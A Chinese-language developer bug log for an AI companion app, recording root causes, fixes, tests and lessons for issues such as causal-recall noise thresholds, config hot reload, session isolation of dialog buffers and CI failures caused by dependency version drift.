**修复：** 移除两个文件的模块级置 None，统一由 conftest 管理。验证 93 passed。

**同类 Bug 2（§37 型）：** `causal_graph.CausalGraph.__del__` 直接 `self.close()`，无 `sys.is_finalizing()` 防护、无 try/except——GC/解释器关闭期若 builtins/模块已清理，`__del__` 抛异常可能触发 GC 死循环。
**修复：** 对齐 `event_store.__del__` 防护模式：`is_finalizing()` 提前返回 + try/except 吞异常。验证 171 passed。

**经验：** 把已知 bug 的根因做成"可搜索模式"清单（`sys.modules` 污染 / `__del__` 无防护 / 缺 import / 版本硬编码），每次审计按清单批量 grep，能高效发现同类问题。

---

## 39. mypy 修复引入回归：input_controller 幂等被破坏（后端）

**现象：** 全量测试 `test_input_controller.py::test_init_idempotent_and_force` 失败（`PyAutoGUIController` 被创建 2 次，期望 1 次）。全量 5833 passed / 1 failed。

**根因：** mypy 自动修复时，为消除 `_initialized` 的 var-annotated 错误，在 `hasattr(self, '_initialized')` **判断之前**加了 `self._initialized: bool = False`——赋值语句每次 `__init__` 都重置标志为 False，使幂等短路 `hasattr(...) and self._initialized and not force` 永远为假 → 二次 init 重新创建 controller。

**修复：** 改为**仅声明不赋值** `self._initialized: bool`（mypy 满足声明，运行时不再重置标志），幂等逻辑恢复。

**验证：** `test_input_controller.py` 24 passed；`mypy modules/output_system/input_controller.py` 0 errors。

**教训：** 自动类型修复（加声明/注解）可能引入**行为变化**——"加一行初始化"≠"加注解"。mypy 修复后必须跑**该文件的全部测试**（不只 mypy 0 errors）验证行为不变。

---

## 40. 深度回忆无噪声守卫 → 无关查询臆造因果链（后端）

**现象：** 对 `deep_recall("今天天气怎么样")`、`deep_recall("今天午饭吃什么")` 等完全无关的查询，深度回忆仍**成功**返回锚点 + 因果链 + 佐证事件（如把"午饭吃什么"锚到「人手不足」并输出 6 条因果链）。评测矩阵暴露：`find_anchor_nodes` 对噪声查询返回锚点「库存告急」0.356。

**根因（两层）：**
1. `causal_graph.find_anchor_nodes` 语义分用**除以最大值归一化**（`sim / max_sem_score`）——无关查询也会把"语义最近"的节点抬到固定 `0.4×1.0=0.40`，属于"矮子里拔将军"；
2. `deep_recall` 拿到锚点后**无任何置信度下限校验**（depth_recall.py 原 `anchors[0][1]` 直接使用），0.40 分照样继续跑。

**修复：**
- `find_anchor_nodes`：语义分改用**绝对余弦相似度**；无关键词命中的节点必须 `abs_sem ≥ 0.30`（`_MIN_ANCHOR_SEMANTIC_SIMILARITY`）才构成锚点，得分直接用 `abs_sem`
- `deep_recall`：新增锚点置信度守卫 `CAUSAL_MIN_ANCHOR_CONFIDENCE`，低于阈值回退浅层（`low_anchor_confidence`）
- 阈值校准（实测）：真实语义匹配 ≥0.53、闲聊噪声 ≤0.37 → 锚点下限定为 **0.50**（`config/settings.py`）

**验证：** 噪声查询全部正确回退（`no_anchor_nodes` / `low_anchor_confidence`），深度佐证 0 误召回；正常查询锚点置信度从虚高的 1.0/0.40 变为真实的 0.90-0.94。

**经验：** 归一化分数在"候选集无相关项"时必然产出高分，任何打分环节都要考虑**绝对阈值**而非相对归一化。

---

## 41. 跨场景事件污染佐证 + 增量挂链自我强化（后端）

**现象：** 「服务器宕机」事件 `ev_server_down` 反复混入「项目延期」场景的深度回忆佐证事件；且一旦混入，`_incremental_update` 会把它**永久挂到延期因果节点**上（写 `causal_node_ids`），下次直接命中 1.0，误检被自我强化。

**根因：** `depth_recall._causal_relevance` 的向量匹配兜底太宽松——`ev_server_down`（"故障持续三小时…"）与目标节点「发布事故」余弦 **0.402** 过 0.35 准入线；同时 `_recall_events` 的语义分只有 `0/0.5` 两档，`_incremental_update` 对佐证事件**无因果门槛**一律挂链。

**修复（depth_recall.py）：**
1. `_recall_events` 增加**佐证准入门槛** `CAUSAL_MIN_EVENT_RELEVANCE=0.35`：因果关联不足的事件不得冒充因果佐证
2. `_incremental_update` 增加**挂链守卫**：`_causal_relevance < 0.35` 的事件不进因果图
3. `_causal_relevance` 改用注入的 `self._graph`（替代 `CausalGraph.get_instance()` 单例，生产等价、测试更稳）

**验证：** 延期场景佐证不再出现服务器事件；单测 `test_incremental_update_no_causal_relevance_skipped` 覆盖。

**经验：** "语义相关" ≠ "因果相关"。佐证事件必须有**显式关联或词项证据**支撑，纯语义相似度不能冒充因果佐证；且**写入型副作用**（挂链）必须有独立门槛，不能依赖"进了结果列表"。

---

## 42. 显式归属守卫过度杀伤同链事件（后端）

**现象：** 新增矩阵场景后，`deep_recall("新功能上线后为什么出现回归")` 漏掉佐证事件 `ev_regression`（挂「功能回归」节点，与锚点「新功能上线」同因果链但不在目标集合内）。

**根因：** §41 引入的"显式归属守卫"（事件所有显式关联都在目标集合外 → 返回 0）**一刀切**——把同链下游事件也误杀了：锚点集合只有 `{n_feature}`，`ev_regression` 归属 `n_regression` 不在集合内 → 0。

**修复：** 守卫改为**图上连通性判断**：事件归属节点若与目标集合 1 跳邻接（同一因果链，`_node_connected_to_set`）视为同链相关，不再零分；同链关联给**基础分 `0.4 + 0.6×信号`**（与直接命中同档，向量/文本信号调节）。孤立节点（如「补丁发布」）仍返回 0，跨场景防护不受影响。

**验证：** `ev_regression` 因果关联从 0.000 → 1.000 正常召回；`ev_patch_day` 仍被排除。新增单测 `test_causal_relevance_connected_assignment`。

**经验：** 用"不在集合内"判定"无关"是**欠考虑**的——因果图里集合外的邻居可能是同链相关。负向判定要基于**图结构**（连通性）而非**集合成员**。

---

## 43. 因果链单节点噪点与重复刷屏（后端/展示）

**现象：** 深度回忆输出大量**单节点链**（如 `人手不足 (85%)`，没有箭头、看不到与锚点的关系），且同一链路重复出现多次（如「人手不足」出现 2 次）；溯源链方向用 `←` 拼接，语义混乱。

**根因：** `causal_tree.trace_up/trace_down` 的 `path_nodes` **不含起点节点**——单跳因果只回传一个前驱节点；`deep_recall` 对锚点 + 每个邻居都调 `trace_up`，不同入口产出相同链路不去重。

**修复（depth_recall.py）：**
- 收集链后**补全锚点**：溯源链尾部补锚点、预测链头部补锚点 → 单跳因果显示完整路径「人手不足 → 项目延期」
- 按节点序列**去重**
- 展示统一为因→果顺序 ` → ` 拼接（`DeepRecallResult.format` / `result_fusion.format_deep_recall_result` / `_build_conclusion`）

**验证：** 因果链从"6 条单节点链（重复）"变为"3 条完整路径（去重）"；结论「核心链路: 人手不足 → 项目延期」。相关展示断言同步更新。

---

## 44. CI 全量随机 flaky —— `set_event_loop(None)` 残留污染（测试）

**现象：** CI 全量（`pytest tests`，随机顺序）偶发 `test_screen_router_ext.py::test_merge_vision_sync_no_running_loop` 报 `RuntimeError: There is no current event loop in thread 'MainThread'`；单跑/按目录跑均通过，无法本地稳定复现。

**根因：** `test_model_runner_ext.py::test_reject_session_user_responses` 结束时 `asyncio.set_event_loop(None)` **不还原**先前的 loop。Python 3.13 下 `asyncio.get_event_loop_policy().get_event_loop()` 在无当前 loop 时直接抛 RuntimeError（不再隐式创建）。随机顺序下该污染测试落在 `test_screen_router_ext` 之前即触发。

**修复：**
- 污染源：保存并还原先前的 event loop（`except RuntimeError → old=None` 处理 3.13 无 loop 情形），不再残留 `set_event_loop(None)`
- 受害者：`test_screen_router_ext` 保存旧 loop 同样容错 `RuntimeError → None`

**验证：** 两文件 + 相关 381 项测试通过；污染机理本地直接验证（`set_event_loop(None)` 后 `get_event_loop_policy().get_event_loop()` 必抛）。

**教训：** 任何"切走"全局单例（事件循环、sys.modules、环境变量）的测试**必须还原**，且还原代码要考虑 Python 版本行为差异（3.13 不再隐式创建 loop）。

---

## 45. CI 全量随机 flaky —— `/tools` 路由断言（测试，根因未复现）

**现象：** CI 全量偶发 `test_api_main.py::test_register_module_routers_includes_all` 报 `AssertionError: /tools`（`register_module_routers` 挂载后无 `/tools` 路由）；单跑/HEAD/按目录跑全部通过。

**根因：** 未能在本地复现。`infra.tool_manager.api` 的 `router` 是**静态定义**（`APIRouter(prefix="/tools")` + 大量固定端点），无任何条件注册；已排查 `sys.modules` 重导入、`include_router`/`tool_router` 被替换等污染途径均无果。推断与 §44 同类——随机顺序下的全局状态污染，污染源待复现。

**处理：** 在断言前加**诊断守卫** `assert tool_router.routes`（给出明确信息"router 被重导入或污染"），使复发时能立即定位，而非笼统的 `/tools` 缺失。

**后续：** 若 CI 再次出现，依据诊断信息定位污染源；本地 `tests/unit` 全量 5834 通过可作基线。


---

## 40. 前端连不上后端：IPv6 localhost 陷阱 + 前端代理层测试盲区（前端/后端）

**现象：** 前端页面点击功能显示"正在等待后端启动"；桌宠/前端进程随后退出。后端 `curl :8080/health` 正常，但前端轮询 `/api/health` 一直失败。

**根因（两个）：**
1. **IPv6 `localhost` 陷阱**：`frontend/server.py` 代理用 `http://localhost:{port}`——macOS 上 `localhost` 解析为 `::1`（IPv6），而后端只绑 `127.0.0.1`（IPv4，`--host 127.0.0.1`）→ urllib 走 IPv6 端口 → **502**。`curl` 优先 IPv4 所以直接测 8080 正常，误导排查。
2. **前端端口固定不同步**：server.py 启动时固定 `BACKEND_URL`，后端端口回退/重启后脱节；cortex 启动后端也不写端口发现文件。

**修复：**
1. 代理改用显式 `127.0.0.1`（IPv4），`pet_widget.py` 同步
2. 代理每次请求**动态读** `read_backend_port()`（端口变化后前端跟随）
3. cortex 启动后端时 `save_backend_port` 同步端口发现文件

**验证：** `8765/api/health` 从 502 → 200。

**测试盲区（为什么没测出来）：** `frontend/server.py`（Python 代理层）此前**零测试**，且：
- pytest 只测 `tests/`（后端），vitest 只测 JS——Python 代理层"无人认领"
- 模块覆盖清单 `_PRODUCTION_DIRS` 不含 `frontend` → "全覆盖"证明只覆盖后端
- IPv6 localhost 是运行时解析行为，单测用 127.0.0.1 直接连不会触发

**修复盲区：** 新增 `tests/unit/test_frontend_server.py`（10 用例：IPv4 回归、动态端口、/api 剥离、错误透传）；覆盖清单纳入 `frontend/`（server.py/pet_widget.py，Qt GUI 启动器豁免）。

**教训：** 任何 Python 代码都须有**明确测试归属**并纳入覆盖清单，不能因"目录属于前端"而脱离测试体系。环境类 bug（DNS/IPv6 解析）需在测试中显式 mock 固定行为。

---

## 46. 模型 client 缓存旧配置 → 改 API URL/Key 不生效（后端/实时生效缺失）

**现象：** 用户在设置页修改模型 API URL/Key 后，**对话仍请求旧 URL**（404），但**心理活动却能用新配置**；只有重启后端才生效。

**根因：**
- `chat_light/ModelRunner.client`（model_runner.py:22-24）与 `ContextSlicer._get_client` 懒建一次并**缓存** `LargeModelClient` 实例
- 配置变更前已构建的 client 持有旧 `api_url/api_key`，之后一直复用 → 请求旧地址
- 心理活动每次 think **新建** `SmallModelClient`（continuous_thinker.py:77-80）→ 读最新 settings → 故能立即生效。两者行为不一致，暴露"缓存旧配置"问题
- 设置页保存（`update_config`）只更新**运行中内存 settings + 重建 model_factory 实例**，但 chat_light 的独立 client 缓存不在 factory 管辖内

**修复（配置指纹热重载，无需重启）：**
- 新增 `infra/model/config_fingerprint.py`：`model_config_fingerprint(tier)` 返回 URL/Key/名称/格式指纹；`close_client_session()` 关闭旧 aiohttp session
- `ModelRunner.client` / `ContextSlicer._get_client`：每次获取比对指纹，变化即重建 client
- `PromptComposer`：按 `base.yaml` mtime 热重载 identity（改提示词实时生效）

**同类排查（A 类：懒建缓存 client 不感知配置变更）：** 全仓库搜 `XxxModelClient()` 构造处，共 3 处——
1. `chat_light/ModelRunner.client` → 已修
2. `chat_light/ContextSlicer._get_client` → 已修
3. `desktop_pet/pet_engine._build_messages`（桌宠懒建缓存 LargeModelClient）→ **本轮同样加配置指纹重建**（pet_engine.py）

其余 client 均每次新建（心理活动/价值观演化 `SmallModelClient(...)` 按需 new）或由 `model_factory` 统一管理（`update_config` 会 `reload_from_config()` 重建），无此问题。

**验证：** 新增 `tests/unit/test_config_hot_reload.py`（指纹变化/复用、ModelRunner 重建、ContextSlicer 重建、base.yaml 热重载），相关 119 项测试通过。

**注意：** 设置页保存（`update_config` 更新内存）才实时生效；**直接编辑 `~/.cortex/settings.json` 文件**仍须重启（`_load_user_config` 只在进程启动时读一次）。

**教训：** 任何"懒建并缓存"的模型/外部 client，都必须感知配置变更（指纹/版本号），否则用户改配置会被缓存"吞掉"。判断标准：**同一类调用，有的每次新建、有的缓存复用**，就是这类 bug 的信号。

---

## 47. 纯对话人设无视编排 active 状态 → 强制套用已停用 agent 的人设（后端）

**现象：** 用户在编排页把自定义 agent `123` 停用、`orchestrator` 激活，但纯对话模式仍被强制套用 `123` 的自定义人设（"芙宁娜"），改其它提示词也"不生效"。

**根因：** `chat_light/prompt_composer.build_system` 硬编码选择纯对话人设：
```python
custom_persona = get_persona("orchestrator")
if not custom_persona:
    for ca in get_custom_agents():
        if ca.get("tier") == "large" and ca.get("role"):
            custom_persona = get_persona(ca["role"])  # 取"第一个" large agent
            if custom_persona: break
```
**无视 `get_agent_active()`**——即使用户在编排里停用了某个 agent，只要它是"第一个 large 自定义 agent"就会被套用。用户"设置了哪个启动哪个"被硬编码优先级覆盖。

**修复（prompt_composer.py）：** 尊重编排的 active 状态，只从激活的 agent 选取：
1. `orchestrator` 激活且有自定义人设 → 优先
2. 否则 → **激活的** large-tier 自定义 agent 人设（`get_agent_active(role)` 过滤）
3. 否则 → 内置 `base.yaml` identity
（`persona_override` 高级修改仍最高，用户显式设置）

**验证：** 用户真实配置（`agent_active={'orchestrator': True, '123': False}`）下，`build_system` 从"芙宁娜人设"变为内置 "你的名字是 Cortex。"。新增 3 项测试覆盖（停用不套用/激活优先/高级修改最高）。

**为什么之前没测到（测试盲区）：**
1. 现有测试 mock 了 `get_persona`/`get_custom_agents`/`get_system_override`，但**从不 mock `get_agent_active`** → 走真实默认值 `True`（settings.py `active_map.get(role, True)`）→ mock 的 agent 全部"默认激活"
2. 只有**正向测试**（"选谁优先"），**没有负向测试**（"谁应被排除"）——停用分支从未被覆盖
3. 用户真实场景（`active_map` 显式写 `False`）在测试里从未出现

**教训：** 测试不能只 mock 关心的方法而让其它逻辑吃真实默认值——默认值会掩盖分支 bug。用户真实操作产生的**状态分支**（停用/激活）必须有显式负向测试。

---

## 48. 同类问题排查：人设选择硬编码 / 配置缓存的系统性审计

**背景：** §47 修复"纯对话无视编排 active"后，按两类根因模式做全仓库排查。

**B 类（硬编码选人设 / 无视 active 状态）：**
| 位置 | 结论 |
|---|---|
| `core/model_runner.py:2451` ModelRunnerManager.start_runner | ✅ **已正确**——启动时检查 `get_agent_active()`，停用的 agent 拒绝启动 |
| `chat_light/prompt_composer.build_system` | ⚠️ 曾硬编码取第一个 large agent → **已修**（§47） |
| `identity.py` 合并自定义 agent 到 roles | ✅ 提供模板给 start_runner，调度层已拦停用；无强制套用 |
| `management/api.py` / `api/main.py` 读取展示 | ✅ 仅读状态，无选择逻辑 |

结论：B 类仅 chat_light 一处漏网，已修复；agent 模式调度从设计上就尊重 active。

**C 类（缓存导致配置改动不生效）：**
| 位置 | 结论 |
|---|---|
| `identity.get_identities()` 缓存 `_merged_identities` | ⚠️ 直接编辑 personas.yaml 不重载；但 `set_custom_agent`/`delete_custom_agent` 会 `_invalidate_identity_cache`——设置页操作实时，属"改文件需重启"同类（§46 已注明） |

**验证：** 相关 119 项测试通过。

---

## 49. 心理活动（conscience）对话缓存跨会话累计（后端）

**现象：** 用户反馈"切换会话后实际注入的上下文没变化反而一直累计"。排查对话历史按 session 隔离无误，但**心理活动**（内心独白）仍引用其它会话的对话。

**根因：** `Conscience` 是**全局单例**（`get_conscience()`），其对话缓存 `_last_dialog_buffer` 是**实例级、不分 session**（conscience.py:70-78）：
```python
def add_to_dialog(self, role, text):       # 无 session 参数
    self._last_dialog_buffer.append(...)    # 所有会话共用一个 buffer
```
`think()` 取 `recent_dialog = self._last_dialog_buffer[-6:]` → 切换到新会话，心理活动的"最近对话"仍是旧会话的，跨会话累计。这是与 §47 同类的"单例状态未按 session 隔离"问题。

（对照：`_get_causal_knowledge`/`_get_node_ids_from_events` 已按 `owner_id` 隔离事件检索，唯独 dialog buffer 漏了。）

**修复（conscience.py）：** 对话缓存改为**按 session 隔离**：
- `_last_dialog_buffer` → `_dialog_buffers: Dict[str, list]`（owner_id/session_id → buffer）
- `add_to_dialog(role, text, session_id="large_primary")`：默认值向后兼容旧调用
- `think()` 的 `recent_dialog` 与内部 `add_to_dialog("assistant", ...)` 都按 `owner_id` 取对应 buffer
- `continuous_thinker.py` 调用处传 `session_id`

**验证：** 新增 `test_add_to_dialog_session_isolated`（不同 session 互不累计），更新 3 处旧断言到新属性；相关 155 项测试通过。

**排查信号：** "某功能是全局单例 + 内部有实例级可变状态（list/dict）缓存" 而该状态本应按会话隔离——`add_to_dialog` 无 session 参数即是可疑点。同类：`_recall_memories` 注入的全局事件记忆【曾经发生的事】也是跨会话累计源（设计为跨会话经验复用，如需严格隔离可后续加开关）。



## 50. 因果图不跟记忆库走 → 多记忆库因果知识跨库污染（后端）

**现象：** 切换记忆库后事件库（EventStore/FAISS）随库切换，但因果图仍全局共享（`data/causal.db`）——不同人格/体系的记忆库提炼的因果知识互相污染，深度回忆用 A 库的因果链佐证 B 库的事件。

**根因：** `switch_memory_lib`（settings.py）只切换 `MEMORY_DB_PATH / MEMORY_FAISS_INDEX / MEMORY_ID_MAP` 三个事件库路径，**不切换 `CAUSAL_DB_PATH`**；`CausalGraph` 全局单例固定用 `data/causal.db`，`_reset_memory_singletons` 也不重置因果图单例。

**修复（因果图跟记忆库走）：**
- 每个记忆库配独立因果图路径：`lib["causal"] = data/causal_{safe}.db`（与事件库同目录，同名派生）
- `get_memory_libs` 默认库、`create_memory_lib`、`delete_memory_lib` 默认重建均带 `causal` 字段
- `switch_memory_lib` / `_apply_current_memory_lib`（启动时）同步设置 `CAUSAL_DB_PATH`，且**兼容旧库**（无 causal 字段时按库名派生并补写 memory_libs.json）
- `_reset_memory_singletons` 重置 `CausalGraph._instance`，切库后按新路径重新加载

**验证：** 新增 5 项测试（切换因果路径 / 旧库派生兼容 / 创建带 causal / 启动应用 / CausalGraph 单例重置），相关 403 项测试通过。

**教训：** "多套隔离存储"（记忆库）必须**完整复制隔离维度**——只隔离事件库而遗漏因果图/向量索引/单例，会让看似隔离的体系在推理层串味。审计点：隔离库的**所有**路径型配置 + 相关单例是否一起切换。

## 51. 心理活动显示思维链而非内心独白（后端）

**现象：** 心理活动（内心独白）输出变成大段思维链——"用户让我回忆过去的经验…让我组织语言…构思：…让我检查…"，而不是括号包裹的简短独白。

**根因（两层）：**
1. **`max_tokens=500` 太小**：思考型（Reasoner）模型（deepseek-v4-flash）会先输出长思维链再产出正式独白。心理活动 prompt 含因果知识+历史对话，模型思考超过 500 token 被截断在思考阶段 → `content` 为空。
2. **`small_model_client.generate` 的 reasoning 兜底把思维链当输出**：`if not content and "reasoning_content" in message: content = reasoning`（small_model_client.py:186-189）——content 为空时把完整思维链当作正式输出返回。

实测：模型对心理活动请求，正常时 `content` 是干净的"（我记得…）"独白（500→128字、1500→149字）；只有思考被截断（content 空）时才触发 reasoning 兜底显示思维链。

**修复：**
- `conscience.think`：`max_tokens` 500 → **1500**（给思考留足空间，产出正式 content）
- 三个模型 client 的 `generate()` reasoning 兜底全部改为 `fallback_to_reasoning: bool = False` **默认关闭**：
  - `small_model_client.generate`、`large_model_client.generate`、`medium_model_client.generate`
  - 思考过程（思维链）**永远不冒充正式输出**——content 为空即返回空，由调用方降级；仅显式开 `True` 的极少数"以思维链为产物"场景才兜底
  - 全仓库确认**无非测试调用方传 True**；流式路径（large chat_stream）本就正确分离 `reasoning_content` 到思考区

**验证：** 更新三个 client 的默认行为测试（`test_reasoning_not_used_by_default` / `test_generate_does_not_use_reasoning_by_default`）+ 显式 True 测试；相关 299 项测试通过。

**教训：** 思考过程与正式输出是**两个独立通道**——`content` 是产物、`reasoning_content` 是过程，**永远不应混用**。模型截断/异常时宁可返回空让调用方降级，也不能把思维链塞进正式输出；"兜底"默认必须关闭，需显式选择才启用。

---

## 41. 切换会话后心理活动框消失 —— mental 事件不持久化（前端/后端）

**现象：** 前端切换会话窗口后，"心理活动"框消失（该会话的心理活动记录不可见）。

**根因：** 心理活动（`msg_type='mental'`，conscience 内心独白）此前**只做实时 WS 推送、不持久化**（`push_content(persist=False)`，设计为避免污染 AI 上下文）——切换会话后历史加载无 mental 消息 → 框为空。

**修复：**
1. 后端：`multi_model_orchestrator` 心理活动持久化为 `role="mental"`（`persist=True`）；`api_stream` 恢复上下文时过滤 `mental`（同 thought，不污染模型输入）
2. 前端：`chat.js` 切换会话历史加载时渲染 `role="mental"` → `kind:'mental'` 心理活动框（与实时事件一致）

**验证：** 后端 212 passed + 前端 chat store 27 passed；mental 以 `role="mental"` 持久化、恢复上下文被过滤。

**注意：** `chat_gateway` 中 conscience 逐段 mental（流式 token 中间态）仍不持久化——主要心理活动（orchestrator 整合的内心独白）已持久化可见。

## 52. CI 测试失败排查：PyQt6 环境缺失 + 测试依赖真实用户配置（测试/环境）

**现象：** CI（ubuntu，Python 3.11）全量失败 3 项：
- `test_frontend_server.py::test_pet_widget_*`（2 项）—— `ModuleNotFoundError: No module named 'PyQt6'`
- `test_api_main.py::test_register_module_routers_includes_all` —— `AssertionError: /tools`（历史 flaky，§45，诊断守卫已加）

**根因 1（PyQt6 环境缺失）：** `frontend/pet_widget.py` 顶层 `from PyQt6.QtCore import ...`，但 `requirements.txt`/`pyproject.toml` **没有 PyQt6**——本地 macOS 装了所以本地过，CI ubuntu 没装 → 测试 import pet_widget 失败。测试只读 `BACKEND_URL`（端口发现），不实例化 Qt。

**修复：** `tests/conftest.py` 新增 session autouse fixture `mock_pyqt6_if_missing`——PyQt6 不可用时向 `sys.modules` 注入 MagicMock 模块树（QtCore/QtGui/QtWebChannel/QtWebEngineCore/QtWebEngineWidgets/QtWidgets），pet_widget 可正常导入；真实环境（本地有 PyQt6）不 mock。验证：无 PyQt6 环境下 pet_widget 导入成功且 BACKEND_URL 正确。

**根因 2（conscience 属性改名未同步 integration 测试）：** 心理活动对话缓存改 `_dialog_buffers`（§49）时只更新了 `tests/unit/test_conscience_ext.py`，`tests/integration/test_conscience.py` 仍引用 `_last_dialog_buffer` → AttributeError。

**修复：** 同步 integration 测试到 `_dialog_buffers`。

**根因 3（reasoning 兜底默认改 False 未同步全部测试）：** `fallback_to_reasoning` 默认改 False（§51）时只更新了 `test_large_model_client_ext.py` / `test_small_model_client_ext.py` / `test_medium_model_client.py`，遗漏 `test_model_client_chat.py::test_generate_reasoning_fallback`。

**修复：** 同步该测试（默认不返回思维链 + 显式 True 兜底）。

**根因 4（prompt_composer 测试依赖真实 personas.yaml）：** 纯对话人设尊重编排 active 后（§47），`test_chat_light_prompt.py` / `test_chat_light_ext.py` 的 composer 测试**没 mock `get_agent_active`** → 依赖用户真实 `~/.cortex/personas.yaml` 的编排状态（orchestrator 激活与否），用户改配置即 flaky——正是 §47 教训"测试吃真实默认值"的复现。

**修复：** 相关测试 mock `Settings.get_agent_active`（确定化），不依赖真实用户配置。

**验证：** 相关 226 项测试通过；`pytest tests/unit` 全量通过（PyQt6 mock / conscience / reasoning / get_agent_active 修复均生效）。

**教训：** ① 测试 import 被测模块时，环境缺桌面/原生依赖（PyQt6 等）必须在 conftest 统一 mock，不能依赖"本地恰好装了"；② 改内部属性/默认值时，要全局搜索所有引用（含 integration 测试）；③ 任何读用户真实配置文件（personas.yaml/settings.json）的测试都必须 mock 读取层，否则用户改配置即 flaky。

## 53. 配置指纹重建在测试环境触发真实 client 构造 → `API key 不能为空`（后端/测试）

**现象：** CI 失败 6 项 `ValueError: API key 不能为空`（test_config_hot_reload / test_pet_engine / test_pet_engine_ext），本地通过、CI 必现。

**根因（两层）：**
1. **显式注入的 client 被指纹重建覆盖**：测试设 `pe._client = _real_client()`（api_key="t"），但配置指纹逻辑 `if _client is None or _client_cfg != cfg` 中 `_client_cfg` 为 None（测试没记录）→ `None != cfg` → 重建为**无参** `LargeModelClient()` → 读 settings 的 LARGE_MODEL_API_KEY（CI 无 `.env`/`~/.cortex/settings.json` → 空）→ 抛 `ValueError: API key 不能为空`。本地有用户 key 所以过，CI 无 key 必现。
2. **模块级 from-import 使测试 mock 失效**：`ModelRunner` 模块顶部 `from infra.model.large_model_client import LargeModelClient` 绑定后，`monkeypatch.setattr("infra.model.large_model_client.LargeModelClient", ...)` 只改源模块属性，ModelRunner 里已绑定的引用不变 → 测试 mock 无效 → 真实构造 → 同样报错。

**修复（ModelRunner.client / pet_engine._build_messages）：**
- 重构配置指纹判断为三分支：`_client is None`→懒建；`_client_cfg is None`（显式注入）→**只记录指纹不重建**；`_client_cfg != cfg`→重建
- client 构造改**函数内 import** `from infra.model.large_model_client import LargeModelClient`——每次从源模块取，测试 patch 源模块属性即生效
- 同步更新 `test_model_runner_client_lazy` 的 patch 路径为源模块

**验证：** 相关 287 项测试通过；无 API key 环境下显式注入的 client 不再被覆盖、mock 正常生效。

**教训：** ① "懒建缓存 + 配置指纹重建"必须**尊重显式注入**（`_client_cfg` 缺失≠需要重建，可能只是外部设置的实例）；② 模块级 `from X import Y` 会把 Y 绑定到本命名空间，测试 mock 源模块属性不生效——**需要在函数内 import 或通过模块引用访问**才能被 patch。

## 54. CI `/tools` 路由断言失败——fastapi 0.141 惰性 `_IncludedRouter`（测试）

**现象：** CI（ubuntu/Python 3.11）`test_api_main.py::test_register_module_routers_includes_all` 稳定失败 `AssertionError: /tools`，本地（3.13）从不失败。诊断：tool_router routes=17 非空、include_router 是原始方法、app.router 正常，但 `app.routes` 里全是默认路由（/docs 等）+ 一个 `''`，手动 include 也"失败"。

**根因：fastapi 版本行为变化（非污染）：**
- **fastapi 0.141+**（CI 装 `fastapi>=0.104.1` → 最新 0.141）的 `include_router` **不再立即展开 APIRoute**，而是封装成惰性的 `fastapi.routing._IncludedRouter`（自身无 `.path`，实际路由在 `original_router.routes` 里）
- 测试用 `getattr(r, "path", "")` 判断路由 → `_IncludedRouter` 无 `.path` → 返回 `''` → 断言 `/tools` 缺失
- 本地 fastapi 0.135.2 是**展开**行为 → 测试通过。本地 3.11 venv 装 0.141.1 复现，确认是版本差异

**修复（tests/unit/test_api_main.py）：**
- 新增 `_collect_route_paths(routes)`：递归展开 `_IncludedRouter.original_router.routes` 收集真实 path，兼容 fastapi 0.135（展开）与 0.141+（惰性封装）
- `test_register_module_routers_includes_all` / `test_register_module_routers_skips_difference_when_disabled` 改用该 helper

**验证：** 3.11 venv（fastapi 0.141.1，CI 同版本）下 `/tools` 测试通过；本地 3.13 120 项通过。

**教训：** Web 框架版本升级可能改变"看似稳定"的行为（include_router 展开→惰性封装）。测试对 `app.routes` 的路径断言要用**递归收集**（兼容 `_IncludedRouter`/`Mount` 等包装），不能假设路由对象都有 `.path`；且本地与 CI 的 fastapi 版本差异会掩盖这类问题——**应在与 CI 相同的 Python/依赖版本下验证**。

## 55. 依赖版本漂移——CI 装最新、本地停旧版（`>=` 不锁版本）

**背景：** §54 的 `/tools` 失败根因是 fastapi 0.141 行为变化（惰性 `_IncludedRouter`），而本地 0.135.2 是旧行为。为什么 CI/本地版本不一致？

**根因：** `requirements.txt` 用 `fastapi>=0.104.1`（只有下限、不锁上限）：
- **CI**：每次全新环境 `pip install -r`，装当前最新（0.141.1）
- **本地**：环境里已有的 0.135.2 满足 `>=0.104.1`，pip 不升级 → 停在旧版
- 结果：CI 与本地依赖版本漂移 → Web 框架行为变化在 CI 暴露、本地永远测不出来

**修复（锁定版本）：**
- `requirements.txt`：`fastapi>=0.104.1` → `fastapi==0.141.1`（锁到已验证版本，含注释说明原因）
- 测试已兼容 0.135（展开）/ 0.141（惰性封装）两种 include_router 行为（§54），即使未来锁定被放宽也不会脆断

**验证：** 本地/CI 统一 fastapi 0.141.1 后行为一致；§54 测试在 0.141.1 下通过。

**教训：** `>=` 版本约束在"每次全新安装"的场景（CI/部署/新机器）天然漂移——**CI 装到最新、旧环境停在旧版**，任何框架行为变化都会变成"CI 红、本地绿"。核心 Web/运行时依赖应**锁定 `==`**（或引入 lock 文件），CI 与本地用同一版本验证。

---

## 42. 环境感知未注入大模型上下文 —— dd1ee8b 重构回归（后端）

**现象：** agent 模式（model_runner）与纯对话（chat_light）下，模型的 system prompt 里没有【环境感知】——感知系统在运行（窗口/屏幕/OCR），但模型看不到环境。

**根因：** `dd1ee8b`（2026-06-27）重构"上下文和提示词系统"时**移除了编排器的 `get_context_summary()` 感知注入调用**；重构后的新机制（`PerceptionSource`→`PerceptionPool`）只接入了桌宠/连续思考（core）/主动搭话，**未接入 `model_runner`（agent）与 `chat_light`（纯对话）**——感知注入从此断了约 2 个月。

**修复：**
1. `model_runner._build_system_prompt_for_mode` 调用处：`PerceptionSource().collect()` → 追加【环境感知】块
2. `chat_light/continuous_thinker`：心理活动注入后同样追加【环境感知】
3. 均 try/except 容错（感知未初始化/异常不影响正常对话）

**验证：** 两处注入均生效（mock PerceptionSource → system_prompt 含环境感知）；新增 `test_perception_injection.py`（4 用例）；相关 266 passed。

**教训：** 大规模重构（上下文/提示词系统）后必须回归"数据→prompt"完整链路；感知这类"采集端正常但注入端断"的问题，代码审查难发现，需注入链路测试。

## 56. 人设存储两套来源 + 反馈闭环节点集合未按会话隔离（后端）

**现象：** 用户在编排/设置页改人设，对话 system prompt 生效但**心理活动（内心独白）不生效**——心理活动仍用 roles.yaml 内置模板。另：多会话并发时心理活动的反馈闭环（analyze_feedback 调整因果图置信度）可能用到**其它会话**的因果节点。

**根因（两个）：**
1. **人设两套来源**：对话用 `personas.yaml`（get_persona 用户自定义，core 模式 composer.py:139 也 get_persona 覆盖），心理活动用 `config/prompts/roles.yaml` 内置（conscience._resolve_role 直接读 roles.yaml）——改一处，另一处不变。
